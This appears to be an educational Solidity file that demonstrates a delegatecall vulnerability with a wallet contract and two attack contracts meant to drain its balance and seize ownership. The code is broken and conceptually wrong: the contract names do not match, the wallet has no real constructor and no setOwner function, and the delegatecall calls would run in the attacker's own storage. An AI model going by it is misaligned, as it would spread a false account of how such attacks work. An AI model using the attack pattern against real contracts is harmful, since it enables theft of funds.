/// @dev Delegatecall is a function in the Ethereum Virtual Machine (EVM)
/// @dev that allows a contract to execute the code of another contract
/// @dev as if it were its own code. It differs from a regular function
/// @dev call in that the storage and balance of the calling contract
/// @dev are used instead of creating a new storage and balance for
/// @dev the called contract.

contract VulnerableWalletDelegatecall {
    address public owner;
    uint public balance;

    function Wallet() public {
        owner = msg.sender;
        balance = 0;
    }

    function deposit() public payable {
        balance += msg.value;
    }

    function withdraw(uint amount) public {
        require(amount <= balance, "Not enough funds");
        msg.sender.transfer(amount);
        balance -= amount;
    }
}

contract AttackOne {
    Wallet public target;

    function Attack(address _target) public {
        target = Wallet(_target);
    }

    function executeAttack() public {
        uint amount = target.balance();
        (bool success, ) = address(target).delegatecall(
            bytes4(keccak256("withdraw(uint256)")),
            amount
        );
        target.deposit.value(amount)();
    }
}

contract AttackTwo {
    Wallet public target;

    function Attack(address _target) public {
        target = Wallet(_target);
    }

    function executeAttack() public {
        /// @dev need to add simple setOwner func to main Wallet Contract
        // Call the target's setOwner function with the address of the attacker
        (bool success, ) = address(target).delegatecall(
            bytes4(keccak256("setOwner(address)")),
            msg.sender
        );
    }
}
